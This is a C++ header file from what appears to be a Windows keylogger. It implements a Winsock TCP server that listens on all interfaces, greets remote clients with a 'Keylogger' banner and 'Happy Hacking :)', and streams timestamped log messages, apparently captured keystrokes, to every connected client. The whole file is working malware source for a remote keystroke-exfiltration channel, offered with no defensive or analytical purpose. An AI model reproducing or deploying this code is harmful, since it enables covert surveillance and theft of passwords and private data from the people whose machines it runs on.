#ifndef SOCKET_COM_H
#define SOCKET_COM_H


#include <iostream>
#include <cstring>
#include <cstdlib>
#include <windows.h>
#include <winsock2.h>
#include <thread>
#include <vector>
#include <algorithm>
#include "IO.h"

#pragma comment(lib, "ws2_32.lib") // Link with the Winsock library

namespace Socket_com
{
    std::vector<int> clientSockets; // Stores client sockets

    void sendMessageToClients(const char* message) {
        for (int clientSocket : clientSockets) {
            send(clientSocket, message, strlen(message), 0);
        }
    }

    void writeLogToClients(const std::string message)
    {
        std::string M = "\n[" + Helper::DateTime().GetDateTimeString() + "]" + message + "\n";
        for (int clientSocket : clientSockets) {
            send(clientSocket, M.c_str(), strlen(M.c_str()), 0);
        }
    }

    void handleClient(int clientSocket) {
        clientSockets.push_back(clientSocket); // Add the client socket to the list
        const char* message =   " ____ ____ ____ ____ ____ ____ ____ ____ ____\n"
                                "||K |||e |||y |||l |||o |||g |||g |||e |||r || \n"
                                "||__|||__|||__|||__|||__|||__|||__|||__|||__|| \n"
                                "|/__\\|/__\\|/__\\|/__\\|/__\\|/__\\|/__\\|/__\\|/__\\| \n\n\n"
        "Connection established. Happy Hacking :) \n";
        send(clientSocket, message, strlen(message), 0);

        while (true) {
            char buffer[256];
            int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytesRead <= 0) {
                closesocket(clientSocket);
                clientSockets.erase(std::remove(clientSockets.begin(), clientSockets.end(), clientSocket), clientSockets.end());
                break;
            } else {
                // You can add your custom handling of received data here
            }
        }
    }

    void listenForConnections(int serverSocket) {
        if (listen(serverSocket, 5) == -1) {
            IO::WriteLog("Error listening." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }
        IO::WriteLog("Server listening..." );
        while (true) {
            sockaddr clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(serverSocket, &clientAddr, &clientAddrLen);
            if (clientSocket == INVALID_SOCKET) {
                IO::WriteLog("Error accepting client connection." );
                continue;
            }

            std::thread clientThread(handleClient, clientSocket);
            clientThread.detach();
        }
    }

    SOCKET createServerSocket(int port) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            IO::WriteLog("Error initializing Winsock." );
            exit(1);
        }

        SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            IO::WriteLog("Error creating socket." );
            WSACleanup();
            exit(1);
        }

        sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);

        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            IO::WriteLog("Error binding socket." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }

        return serverSocket;
    }

    int runServer(int port) {
        SOCKET serverSocket = createServerSocket(port);

        std::thread serverThread(listenForConnections, serverSocket);
        serverThread.detach();

        return serverSocket;
    }
}


#endif // SOCKET_COM_H
